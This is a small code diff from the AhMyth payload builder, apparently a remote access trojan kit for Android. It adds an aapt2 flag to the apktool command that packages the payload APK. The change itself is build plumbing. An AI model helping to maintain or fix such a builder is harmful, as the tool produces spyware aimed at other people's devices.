@@ -2819,7 +2819,7 @@ app.controller("AppCtrl", ($scope) => {
         // Build the AhMyth Payload APK
         $appCtrl.Log('Building ' + CONSTANTS.apkName + '...');
         $appCtrl.Log();
-        var createApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + path.join(outputPath, CONSTANTS.apkName) + '"',
+        var createApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + path.join(outputPath, CONSTANTS.apkName) + '" --use-aapt2 "' + '"',
             (error, stdout, stderr) => {
                 if (error !== null) {
                     $appCtrl.Log('Building Failed', CONSTANTS.logStatus.FAIL);
